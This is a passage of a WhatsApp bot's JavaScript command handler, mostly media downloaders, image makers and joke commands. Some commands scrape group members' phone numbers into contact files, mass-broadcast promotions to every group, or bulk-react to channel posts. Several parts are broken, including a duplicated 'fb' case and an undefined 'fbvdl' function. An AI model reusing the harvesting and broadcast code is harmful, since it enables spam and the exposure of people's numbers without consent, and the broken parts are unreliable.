      form.append("reqtype", "fileupload");
      form.append("fileToUpload", buffer, {
        filename: "photo.jpg",
        contentType: "image/jpeg",
      });
      const res = await axios.post("https://catbox.moe/user/api.php", form, {
        headers: form.getHeaders(),
      });
      if (typeof res.data === "string" && res.data.startsWith("http"))
        return res.data.trim();
      throw new Error("Gagal upload ke Catbox: " + res.data);
    };

    const imageUrl = await uploadToCatbox(buffer);
    if (!/^https?:\/\//.test(imageUrl))
      throw new Error("URL hasil upload tidak valid");

    console.log("Image URL:", imageUrl);

    // Panggil API FAA ToFigure tanpa tangan
    const apiUrl = `https://api-faa.my.id/faa/tofigurav2?url=${encodeURIComponent(
      imageUrl
    )}&prompt=${encodeURIComponent("make a 3D anime figure without visible hands or arms")}`;

    const resApi = await axios.get(apiUrl, {
      responseType: "arraybuffer",
      timeout: 180000,
    });

    const resultBuffer = Buffer.from(resApi.data);
    if (!resultBuffer || resultBuffer.length < 1000)
      Reply("❌ API tidak mengembalikan gambar yang valid");

    // Kirim hasil
    await conn.sendMessage(
      m.chat,
      { image: resultBuffer, caption: `✨ Hasil AI To Figure (Tanpa Tangan)` },
      { quoted: m }
    );

    await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

  } catch (e) {
    console.error(e);
    Reply(`❌ Terjadi kesalahan: ${e.message}`);
  }
}
break;

case "delete": case "del": {
if (mess.owner) {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!m.quoted) return Reply("Reply pesannya")
if (m.quoted.fromMe) {
conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
if (!isCreator) return Reply(mess.owner)
conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return Reply(example("Reply pesan"))
conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}
}
break

case 'readmore': {
  if (!text.includes('|')) return Reply('Gunakan tanda "|" untuk memisahkan bagian teks dengan efek readmore.\nContoh: .readmore aku | suka | kamu ❤️')
  const more = String.fromCharCode(8206).repeat(4001)
  const teks = text.split('|').join(more)
  Reply(teks)
}
  break
  
case 'waifu': {
  try {
    await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
    
    const apiUrl = 'https://api.nekolabs.my.id/random/blue-archive'
    const res = await fetch(apiUrl)
    if (!res.ok) throw new Error(`Status ${res.status}`)

    const buffer = await res.arrayBuffer()
    await conn.sendMessage(
      m.chat, 
      { 
        image: Buffer.from(buffer), 
        caption: '🍁 *Nih Blue Archive nya~*' 
      }, 
      { quoted: m }
    )
  } catch (e) {
    console.error(e)
    await Reply(`🍂 *Ups error:* ${e.message || e}`)
  } finally {
    await conn.sendMessage(m.chat, { react: { text: '', key: m.key } })
  }
}
break

case 'gpt': {
    try {
        if (!text) return Reply('gpt versi -3 apa yg kamu cari')
        
        let { data } = await axios.post(
            'https://mpzxsmlptc4kfw5qw2h6nat6iu0hvxiw.lambda-url.us-east-2.on.aws/process',
            {
                messages: [
                    { content: "Hello, how can i assist you today?", role: "system" },
                    { content: text, role: "user" }
                ],
                model: "gpt-3.5-turbo-0125",
                temperature: 0.9
            },
            {
                headers: {
                    'User-Agent': 'okhttp/3.14.9',
                    'Connection': 'Keep-Alive',
                    'Accept-Encoding': 'gzip',
                    'Authorization': 'Bearer [OPENAI-KEY-REMOVED]',
                    'Content-Type': 'application/json'
                }
            }
        )
        
        Reply(data.choices[0].message.content)
    } catch (e) {
        Reply(e.message)
    }
}
break

case 'balogo': {
    try {

        if (!args[0]) {
            return Reply(
                `🍀 *Masukkan dua teks untuk logo! (pisahkan dengan |)*\n\n✨ *Contoh: ${command} Kelpin|Gv*`
            );
        }

        let [textL, textR] = args.join(' ').split('|');
        if (!textL || !textR) {
            return Reply(
                `☘️ *Format salah! Gunakan: ${command} TextKiri|TextKanan*`
            );
        }
        
        
        let apiUrl = `https://api.nekolabs.my.id/canvas/ba-logo?textL=${encodeURIComponent(textL)}&textR=${encodeURIComponent(textR)}`;
        let response = await fetch(apiUrl);
        if (!response.ok) {
            console.error('[ba-logo API Error]', response.status);
            return Reply('🍂 *Gagal menghubungi API logo maker!*');
        }

        let buffer = Buffer.from(await response.arrayBuffer());

        await conn.sendFile(
            m.chat,
            buffer,
            'ba-logo.png',
            `*✨ Logo berhasil dibuat!*`,
            m
        );
    } catch (e) {
        console.error('[ba-logo Handler Error]', e);
        Reply(`🍂 *Ups, gagal membuat logo!* \nDetail: ${e.message || e}`);
    } finally {
    }
};
break
case "facebook":
case "fb": {
    if (!text) return Reply("Masukkan link Facebook!")

    const axios = require('axios')
    const cheerio = require('cheerio')

    try {
        await conn.sendMessage(m.chat, { text: "⏳ Mengambil video dari Facebook..." }, { quoted: m })

        // 🔹 Ambil halaman untuk token
        const response = await axios.get("https://fdownloader.net/id", {
            headers: {
                "User-Agent": "Mozilla/5.0"
            }
        })

        const html = response.data
        const exMatch = html.match(/k_exp ?= ?"(\d+)"/i)
        const toMatch = html.match(/k_token ?= ?"([a-f0-9]+)"/i)

        const ex = exMatch ? exMatch[1] : null
        const to = toMatch ? toMatch[1] : null

        if (!ex || !to) return Reply("❌ Gagal ambil token")

        // 🔹 Request ajaxSearch
        const search = await axios.post(
            "https://v3.fdownloader.net/api/ajaxSearch?lang=id",
            new URLSearchParams({
                k_exp: ex,
                k_token: to,
                q: text,
                lang: "id",
                web: "fdownloader.net",
                v: "v2",
                w: ""
            }),
            {
                headers: {
                    "User-Agent": "Mozilla/5.0",
                    origin: "https://fdownloader.net"
                }
            }
        )

        const data = search.data
        if (data.status !== "ok") return Reply("❌ Gagal mengambil video")

        const $ = cheerio.load(data.data)

        // 🔹 ambil semua video
        let videos = []
        $("#fbdownloader .tab__content").eq(0).find("tr").each((i, el) => {
            let quality = $(el).find(".video-quality").text().trim()
            let url = $(el).find("a").attr("href") || $(el).find("button").attr("data-videourl")
            if (url && url !== "#note_convert") {
                videos.push({ quality, url })
            }
        })

        if (!videos.length) return Reply("❌ Video tidak ditemukan")

        // 🔹 pilih kualitas terbaik (biasanya pertama)
        let video = videos[0]

        await conn.sendMessage(m.chat, {
            video: { url: video.url },
            caption: `🎬 Facebook Downloader\n\n📊 Kualitas: ${video.quality}`
        }, { quoted: m })

    } catch (e) {
        console.error(e)
        Reply("❌ Error FDownloader (kemungkinan kena limit / proteksi)")
    }
}
break;
case 'igdl': 
case 'instagram': {
  if (!text) return Reply("Masukkan URL Instagram!\nContoh: .Instagram https://www.instagram.com/p/xxx");

  try {
    const axios = require("axios");
    const cheerio = require("cheerio");
    const igdl = async (u) => {
      let { data } = await axios.get(
        `https://snapdownloader.com/tools/instagram-downloader/download?url=${u}`
      );
      let $ = cheerio.load(data);
      const result = [];
      $(".download-item").each((i, el) => {
        const type = $(el).find(".type").text().trim().toLowerCase();
        const url = $(el).find(".btn-download").attr("href");
        if (url) result.push({ type, url });
      });
      return result;
    };
    await conn.sendMessage(m.chat, {
      react: {
        text: "⏳",
        key: m.key
      }
    });
    const res = await igdl(text);
    if (!res.length) return Reply("Gagal mengambil media.");
    let linkList = res.map((v, i) => `${i + 1}. [${v.type}] ${v.url}`).join('\n');
    let caption = `🎬 Instagram Downloader\n\n✅ No Watermark \n\n✅ HD Quality\n\n> \`ᴄʀᴇᴀᴛᴇᴅ ʙʏ: 𝐄𝐱𝐜𝐥𝐢𝐩𝐳\``;
    for (let i = 0; i < res.length; i++) {
      let media = res[i];
      if (media.type === "video") {
        await conn.sendMessage(m.chat, {
          video: { url: media.url },
          caption
        }, { quoted: m });
      } else if (media.type === "photo" || media.type === "image") {
        await conn.sendMessage(m.chat, {
          image: { url: media.url },
          caption
        }, { quoted: m });
      }
    }
    await conn.sendMessage(m.chat, {
      react: {
        text: "✔️",
        key: m.key
      }
    });
  } catch (e) {
    Reply("Gagal mengunduh media Instagram!\n\n" + e.message);
  }
}
break

case 'quoteimg': {
  if (!q) return Reply("Kirim teks quotes-nya dulu ya.\nContoh: .quoteimg jangan nyerah ya, kamu hebat kok")

  try {
    const { createCanvas, loadImage } = require('canvas')
    const axios = require('axios')

    const width = 1000
    const height = 500
    const canvas = createCanvas(width, height)
    const ctx = canvas.getContext('2d')
    ctx.fillStyle = '#ffffff'
    ctx.fillRect(0, 0, width, height)

    const avatarUrl = await conn.profilePictureUrl(m.sender, 'image')
    const avatarBuffer = (await axios.get(avatarUrl, { responseType: 'arraybuffer' })).data
    const avatarImg = await loadImage(avatarBuffer)

    ctx.drawImage(avatarImg, 60, 130, 240, 240)

    ctx.fillStyle = '#000000'
    ctx.font = '40px sans-serif'

    function wrapText(text, maxWidth) {
      const words = text.split(' ')
      let lines = []
      let line = ''

      for (const word of words) {
        const testLine = line + word + ' '
        const metrics = ctx.measureText(testLine)
        if (metrics.width > maxWidth && line) {
          lines.push(line.trim())
          line = word + ' '
        } else {
          line = testLine
        }
      }
      if (line) lines.push(line.trim())
      return lines
    }

    const maxTextWidth = 600
    const lines = wrapText(q, maxTextWidth)

    let y = 180
    for (const line of lines) {
      ctx.fillText(line, 350, y)
      y += 55
    }

    ctx.fillStyle = '#505050'
    ctx.font = '30px sans-serif'
    ctx.fillText(`- ${m.pushName || m.sender.split('@')[0]}`, 350, y + 20)

    const buffer = canvas.toBuffer('image/png')

    await conn.sendMessage(m.chat, {
      image: buffer,
      caption: 'Berikut quotes-nya~'
    }, { quoted: m })

  } catch (err) {
    console.error(err)
    Reply('Terjadi kesalahan saat mengambil foto profil atau membuat gambar.')
  }
}
break

case 'cekgila': {
  const nama = text||m.pushName||'Kamu'
  const persen = Math.floor(Math.random() * 101)

  const komentar = [
    'Normal... kayak batu bata.',
    'Agak nyeleneh, tapi masih bisa diajak diskusi.',
    'Udah mulai ngaco, tolong dijaga.',
    'Wah ini sih gila bener, cocok masuk rumah tertawa.',
    'Level dewa... gila tapi keren.',
    'Gila banget, sampe bot aja pusing baca chat kamu.',
    'Kayaknya udah enggak bisa diselamatkan 😭',
    'Kamu waras, tapi cuma kalau tidur.',
    'Gila dalam diam... serem banget kamu.',
    'Gila bergaya profesional. Respect.'
  ]

  const kata = komentar[Math.floor(Math.random() * komentar.length)]

  Reply(`🧠 *Tes Kegilaan Hari Ini*\n\n👤 Nama: *${nama}*\n📊 Tingkat Gila: *${persen}%*\n🗯️ Komentar: *${kata}*`)
}
break

case 'jodoh': {
  if (!text.includes('|')) return Reply('Contoh: .jodoh John|Jane');
  const [nama1, nama2] = text.split('|');
  const persen = Math.floor(Math.random() * 100) + 1;
  Reply(`❤️ Kecocokan antara *${nama1.trim()}* dan *${nama2.trim()}* adalah *${persen}%*`);
  break;
}

case 'serfikat': {
  if (!text) return Reply(`Kirim perintah *${command} [teks]*\n\nContoh: *${command} Hilman*`)

  try {
    let url = `https://api.sxtream.xyz/maker/yapping?name=${encodeURIComponent(text)}`
    let res = await fetch(url)

    if (!res.ok) throw '❌ Gagal mengambil data dari API.'

    let buffer = await res.buffer()
    await conn.sendFile(m.chat, buffer, 'srtdarksistem.jpg', `🗣️ Sertifikat Dark Sistem by *${text}*`, m)

  } catch (e) {
    console.error(e)
    Reply('❌ Terjadi kesalahan saat mengambil gambar.')
  }
}
break

case "motivasi": {
  try {
    let res = await fetch('https://veloria-ui.vercel.app/random/motivasi');
    let data = await res.json();

    if (!data || !data.quotes) return Reply("❌ Gagal mengambil quote.");

    let quote = `📜 *Motivasi Hari Ini*\n\n"${data.quotes}"\n\n📝 _Kelpin Gv_`;

    conn.sendMessage(m.chat, {
      text: quote
    }, { quoted: m });

  } catch (e) {
    console.error(e);
    Reply("❌ Terjadi kesalahan saat mengambil data.");
  }
}
  break

case "cekgempa": {
    Reply("Memproses pencarian");
    
    try {
        const response = await fetch("https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json");
        const data = await response.json();
        
        if (!data || !data.Infogempa || !data.Infogempa.gempa) {
            return Reply("Gagal mendapatkan data gempa dari BMKG.");
        }
        
        const gempa = data.Infogempa.gempa;
        
        let caption = `*📈 INFO GEMPA TERKINI*\n\n`;
        caption += `*Tanggal:* ${gempa.Tanggal}\n`;
        caption += `*Waktu:* ${gempa.Jam}\n`;
        caption += `*Magnitudo:* ${gempa.Magnitude}\n`;
        caption += `*Kedalaman:* ${gempa.Kedalaman}\n`;
        caption += `*Lokasi:* ${gempa.Wilayah}\n`;
        caption += `*Koordinat:* ${gempa.Lintang} ${gempa.Bujur}\n`;
        caption += `*Potensi:* ${gempa.Potensi}\n`;
        caption += `*Dirasakan:* ${gempa.Dirasakan}\n\n`;
        caption += `Sumber: BMKG (https://www.bmkg.go.id/)`;
        
        if (gempa.Shakemap) {
            const shakemapUrl = `https://data.bmkg.go.id/DataMKG/TEWS/${gempa.Shakemap}`;
            await conn.sendMessage(m.chat, {
                image: { url: shakemapUrl },
                caption: caption
            }, { quoted: m });
        } else {
            conn.sendMessage(m.chat, { text: caption }, { quoted: m });
        }
    } catch (error) {
        console.log(error);
        Reply("Terjadi kesalahan saat mengambil data gempa.");
    }
}
break

case "savekontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
let res = await m.metadata
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer Skyzopedia - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
Reply(err.toString())
} finally {
if (m.chat !== m.sender) await Reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await conn.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break

case "savekontak": {
if (!isOwner) return Reply(mess.owner)
if (!text) return Reply(example("idgrupnya"))
let res = await conn.groupMetadata(text)
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer Skyzopedia - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
Reply(err.toString())
} finally {
if (m.chat !== m.sender) await Reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await conn.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break

case "jpm3": {
if (!isCreator) return Reply(mess.owner)
if (!q) return Reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return Reply(example("teks dengan mengirim foto"))
const allgrup = await conn.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await conn.downloadAndSaveMediaMessage(qmsg)
await Reply(`Memproses *jpm* testimoni Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await conn.sendMessage(i, {
  footer: `© 2025 ${botname}`,
    buttons: [
    {
    buttonId: ".owner", buttonText: { displayText: "Owner" }, type: 1 
       }
   ],
  headerType: 1,
  viewOnce: true,
  image: await fs.readFileSync(rest), 
  caption: `\n${teks}\n`,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }
  },
}, {quoted: qtoko})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

case "skiplink": {
    if (!text) return Reply(`Contoh : .skiplink https://sub4unlock.co/S9oU0`);
    Reply('wett')
    try {
        let api = `https://fgsi.koyeb.app/api/tools/skip/sub4unlock?apikey=APIKEY&url=${encodeURIComponent(text)}`;
        let { data: json } = await axios.get(api);

        if (!json.status || !json.data?.linkGo) {
            return Reply('Lu masukin url apa tu woy 😂');
        }

        await Reply(`${json.data.linkGo}`);
    } catch (err) {
        Reply(`Eror kak : ${err.message}`)
    }
};
break

const fb = async (urlFesnuk) => {
    if (typeof urlFesnuk !== "string") throw Error(`mana url nya`)
    const r = await fetch("https://fdown.net/download.php", {
        method: "POST",
        headers: { "content-type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({ URLz: urlFesnuk })
    })
    if (!r.ok) {
        const txt = await r.text()
        throw Error(`${r.status} ${r.statusText} ${(txt || `(respond body kosong)`).substring(0, 100)}`)
    }
    const html = await r.text()
    const hd = html.match(/id="hdlink" href="(.+?)" download/)?.[1]?.replaceAll("&amp;", "&")
    const sd = html.match(/id="sdlink" href="(.+?)" download/)?.[1]?.replaceAll("&amp;", "&")
    if (!hd && !sd) throw Error(`tidak ada video yang bisa di download`)
    return { hd, sd }
}

case "fb": {
    if (!text) return Reply(`Contoh : .fb https://www.facebook.com/share/v/...`)
    Reply('wett')
    try {
        const { hd, sd } = await fbvdl(text)
        const videoUrl = hd || sd
        await conn.sendFile(m.chat, videoUrl, '_zenwik.mp4', '', m)
    } catch (e) {
        Reply(`Eror kak : ${e.message}`)
    }
}
break

case "metaai": {
    if (!text) return Reply("*Contoh:* .metaai Apa itu JavaScript?");
    Reply(mess.wait);
    try {
        const apiUrl = `https://api.siputzx.my.id/api/ai/metaai?query=${encodeURIComponent(q)}`;
        const response = await axios.get(apiUrl);
        const data = response.data;
        
        if (data.status && data.data) {
            await Reply(`*Meta AI*\n\n${data.data}`);
        } else {
            Reply("❌ Gagal mendapatkan respons dari Meta AI");
        }
    } catch (error) {
        console.error("Meta AI Error:", error);
        Reply(mess.error);
    }
}
break

case 'accall': {
    if (!m.isGroup) return reply(mess.group);
    
    const groupMetadata = await conn.groupMetadata(m.chat);
    if (!groupMetadata.joinApprovalMode) return reply('Fitur *Join Approval Mode* tidak aktif di grup ini.');

    const pendingList = await conn.groupRequestParticipantsList(m.chat);
    if (!pendingList || pendingList.length === 0) return reply('Gak ada member yang perlu di-ACC bos.');

    const jids = pendingList.map(v => v.jid);
    await conn.groupRequestParticipantsUpdate(m.chat, jids, 'approve');

    reply(`✅ Berhasil ACC *${jids.length}* member.`);
}
break;

case 'pindown': {
    if (!text) return Reply`❌ *Format salah!*
Contoh: ${usedPrefix + command} https://pin.it/xxxxx`;

    try {
        const apiUrl = `https://api.platform.web.id/pinterestdl?q=${encodeURIComponent(text)}`;
        const res = await fetch(apiUrl);
        if (!res.ok) return Reply(`❌ API Error: ${res.status} ${res.statusText}`);

        const json = await res.json();
        console.log('📌 PinterestDL JSON:', JSON.stringify(json, null, 2));

        if (!json.success || !Array.isArray(json.media) || json.media.length === 0) {
            throw new Error("❌ Tidak ditemukan media di URL tersebut.");
        }

        const videoMedia = json.media.filter(media => media.extension === 'mp4');
        const imageMedia = json.media.filter(media => ['jpg', 'jpeg', 'png', 'webp', 'gif'].includes(media.extension));

        if (videoMedia.length > 0) {
            const video = videoMedia[0];
            await conn.sendMessage(m.chat, {
                video: { url: video.url },
                caption: `🎥 *Video Pinterest*
📌 *Kualitas:* ${video.quality}
📌 *Ukuran:* ${video.formattedSize}
📌 *URL:* ${text}`,
                fileName: `pinterest_${Date.now()}.mp4`,
                mimetype: 'video/mp4'
            }, { quoted: m });

            await conn.sendMessage(m.chat, { react: { text: '🎥', key: m.key } });
            return;
        }
        else if (imageMedia.length > 0) {
            const image = imageMedia.reduce((prev, current) =>
                prev.size > current.size ? prev : current
            );

            await conn.sendMessage(m.chat, {
                image: { url: image.url },
                caption: `🖼️ *Gambar Pinterest*
📌 *Kualitas:* ${image.quality}
📌 *Ukuran:* ${image.formattedSize}
📌 *URL:* ${text}`
            }, { quoted: m });

            await conn.sendMessage(m.chat, { react: { text: '🖼️', key: m.key } });
        } else {
            throw new Error("❌ Tidak ditemukan video atau gambar yang valid.");
        }

    } catch (e) {
        console.error('🚨 PinterestDL Error:', e);
        Reply('🚨 *Error:* ' + (e.message || 'Terjadi kesalahan saat mengunduh media.'));
    }
};
break

case "rch2": {
    if (!text) return Reply("Contoh:\n.reactch https://whatsapp.com/channel/xxx/123 ❤️kelpin\n.reactch https://whatsapp.com/channel/xxx/123 ❤️kelpin|5");

    const hurufGaya = {
        a: '🅐', b: '🅑', c: '🅒', d: '??', e: '🅔', f: '🅕', g: '🅖',
        h: '🅗', i: '🅘', j: '🅙', k: '🅚', l: '🅛', m: '🅜', n: '🅝',
        o: '🅞', p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣', u: '🅤',
        v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩',
        '0': '⓿', '1': '➊', '2': '➋', '3': '➌', '4': '➍',
        '5': '➎', '6': '➏', '7': '➐', '8': '➑', '9': '➒'
    };

    const [mainText, offsetStr] = text.split('|');
    const args = mainText.trim().split(" ");
    const link = args[0];

    if (!link.includes("https://whatsapp.com/channel/")) {
        return Reply("Link tidak valid!\nContoh: .reactch https://whatsapp.com/channel/xxx/idpesan ❤️kelpin|3");
    }

    const channelId = link.split('/')[4];
    const rawMessageId = parseInt(link.split('/')[5]);
    if (!channelId || isNaN(rawMessageId)) return Reply("Link tidak lengkap!");
    const offset = parseInt(offsetStr?.trim()) || 1;
    const teksNormal = args.slice(1).join(' ');
    const teksTanpaLink = teksNormal.replace(link, '').trim();
    if (!teksTanpaLink) return Reply("Masukkan teks/emoji untuk direaksikan.");
    const emoji = teksTanpaLink.toLowerCase().split('').map(c => {
        if (c === ' ') return '―';
        return hurufGaya[c] || c;
    }).join('');

    try {
        const metadata = await conn.newsletterMetadata("invite", channelId);
        let success = 0, failed = 0;
        for (let i = 0; i < offset; i++) {
            const msgId = (rawMessageId - i).toString();
            try {
                await conn.newsletterReactMessage(metadata.id, msgId, emoji);
                success++;
            } catch (e) {
                failed++;
            }
        }
        Reply(`✅ Berhasil kirim reaction *${emoji}* ke ${success} pesan di channel *${metadata.name}*\n❌ Gagal di ${failed} pesan`);
    } catch (err) {
        console.error(err);
        Reply("❌ Gagal memproses permintaan!");
    }
}
break

case 'kontol': {
    try {
        if (!text) return Reply('Nn?')
        
        let { data } = await axios.post(
            'https://mpzxsmlptc4kfw5qw2h6nat6iu0hvxiw.lambda-url.us-east-2.on.aws/process',
            {
                messages: [
                    { content: "Hello, how can i assist you today?", role: "system" },
                    { content: text, role: "user" }
                ],
                model: "gpt-3.5-turbo-0125",
                temperature: 0.9
            },
            {
                headers: {
                    'User-Agent': 'okhttp/3.14.9',
                    'Connection': 'Keep-Alive',
                    'Accept-Encoding': 'gzip',
                    'Authorization': 'Bearer [OPENAI-KEY-REMOVED]',
                    'Content-Type': 'application/json'
                }
            }
        )
        
        Reply(data.choices[0].message.content)
    } catch (e) {
        Reply(e.message)
    }
}
break

case 'capcut': {
  try {
    if (!args[0]) return Reply('*Example :* .capcut https://www.capcut.com/tv2/ZSDrUV5e8/')
 
    let { data } = await axios.post('https://3bic.com/api/download', { url: args[0] }, {
      headers: {
        accept: 'application/json, text/plain, */*',
        'content-type': 'application/json'
      }
    })
 
    let base64url = data?.originalVideoUrl?.split('/api/cdn/')[1]
    let video = Buffer.from(base64url, 'base64').toString()
 
    await conn.sendMessage(m.chat, { video: { url: video } }, { quoted: m })
  } catch (e) {
    Reply(e.message)
  }
}
break
case 'tovn': case 'toptt': case 'tovoice': {
    try {
        const quotedMsg = m.quoted?.message;
        if (!quotedMsg) return Reply('⚠️ Reply audio atau dokumen audio yang ingin dijadikan PTT!');

        const isAudio = quotedMsg.audioMessage;
        const isDocumentAudio = quotedMsg.documentMessage?.mimetype?.startsWith('audio/');

        if (!isAudio && !isDocumentAudio) 
            return Reply(`⚠️ Reply audio atau dokumen audio dengan caption ${prefix + command}`);

        const buffer = await m.quoted.download();
        if (!buffer || buffer.length === 0) 
            return Reply('❌ Gagal download audio.');

        await conn.sendMessage(m.chat, {
            audio: buffer,
            mimetype: 'audio/mpeg',
            ptt: true
        }, { quoted: m });

        Reply('✅ Audio berhasil dikonversi menjadi PTT!');
    } catch (err) {
        console.error(err);
        Reply('❌ Terjadi kesalahan saat mengkonversi audio menjadi PTT.');
    }
}
break
case 'conves': {
    if (!text) return Reply('Format salah!\nContoh: .conves 6281234567890 sebener nya aku suka kamu');

    // Pisahkan nomor dan pesan
    let args = text.split(' ');
    let number = args.shift(); // ambil nomor
    let pesan = args.join(' '); // gabungkan sisanya sebagai pesan

    if (!number || !pesan) return Reply('Format salah!\nContoh: .conves 6281234567890 halo sayang');

    // pastikan nomor memakai format WhatsApp
    if (!number.endsWith('@s.whatsapp.net')) number = number + '@s.whatsapp.net';

    try {
        await conn.sendMessage(number, { text: pesan });
        Reply(`Berhasil mengirim pesan ke ${number}`);
    } catch (err) {
        Reply(`Gagal mengirim pesan: ${err.message}`);
    }
}
break
case 'ytmp2': {
 try { if (!args[0]) return Reply(`Gunakan: ${usedPrefix + command} <url>`)
 
await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
 
let url = `https://www.sankavollerei.com/download/ytmp3?apikey=planaai&url=${encodeURIComponent(args[0])}`
let res = await axios.get(url)
let json = res.data
 
if (!json.status) return Reply(`❌ Gagal mengambil data dari API`)
 
let { title, thumbnail, download, duration } = json.result
 
await conn.sendMessage(m.chat, {
  audio: { url: download },
  mimetype: 'audio/mpeg',
  fileName: `${title}.mp3`,
}, { quoted: m })
 
} catch (err) { Reply(`❌ Error\nLogs error : ${err.message}`) } }
break

case 'ah': {
  if (!text) return Reply(`Example: ${prefix + command} Lagu sad`);
  try {		
    let search = await yts(`${text}`);
    if (!search || search.all.length === 0) return Reply(`*Lagu tidak ditemukan!* ☹️`);
    let { videoId, image, title, views, duration, author, ago, url, description } = search.all[0];
    let caption = `「 *YOUTUBE PLAY* 」\n\n🆔 ID : ${videoId}\n💬 Title : ${title}\n📺 Views : ${views}\n⏰ Duration : ${duration.timestamp}\n▶️ Channel : ${author.name}\n📆 Upload : ${ago}\n🔗 URL Video : ${url}`;
    
    await conn.sendMessage(m.chat, {
      image: { url: image },
      caption: caption,
      footer: `${global.namaOwner}`,
      buttons: [
        {
         buttonId: `${prefix}ytmp2 ${url}`, buttonText: { displayText: "Audio" }, type: 1 
        },
       {
         buttonId: `${prefix}ytmp2 ${url}`, buttonText: { displayText: "Audio" }, type: 1 
        }
      ],
      headerType: 1,
      viewOnce: true,
      contextInfo: {
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: global.idSaluran,
          newsletterName: global.namaSaluran
        }
      }
    }, { quoted: m });
  } catch (err) {
    console.error(err);
    Reply(`*Terjadi kesalahan!* 😭\n${err.message || err}`);
  }
}
break
case 'playch': {
    if (!text) return Reply('⚠️ Masukkan ID saluran dan judul lagu!\nFormat: .playch idsaluran | judul lagu');

    // Pisahkan ID saluran dan judul
    let [channelId, ...queryParts] = text.split('|').map(v => v.trim());
    if (!channelId || queryParts.length === 0) return Reply('⚠️ Format salah! Gunakan: .playch idsaluran | judul lagu');

    let query = queryParts.join(' ');

    try {
        const axios = require('axios');

        await conn.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });

        // Ambil lagu dari API
        let apiUrl = `https://api.alvianuxio.eu.org/api/play?query=${encodeURIComponent(query)}&apikey=kayzuMD&format=mp3`;
        let { data } = await axios.get(apiUrl, { timeout: 15000 });
        if (!data?.data?.response) return Reply('❌ Lagu tidak ditemukan!');

        let song = data.data.response;

        // Download audio ke buffer
        const audioResponse = await axios({
            method: 'get',
            url: song.download,
            responseType: 'arraybuffer',
            timeout: 60000,
            headers: { 'User-Agent': 'Mozilla/5.0' }
        });

        const audioBuffer = Buffer.from(audioResponse.data);
        if (!audioBuffer || audioBuffer.length === 0) return Reply('❌ Gagal download audio!');

        // Kirim langsung ke saluran WA
        await conn.sendMessage(channelId, {
            audio: audioBuffer,
            mimetype: 'audio/mpeg',
            fileName: `${song.title}.mp3`,
            ptt: false
            // ptt: true // aktifkan kalau mau jadi voice note
        });

        await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
    } catch (err) {
        console.error(err);
        Reply('❌ Terjadi kesalahan saat mengirim audio ke saluran.');
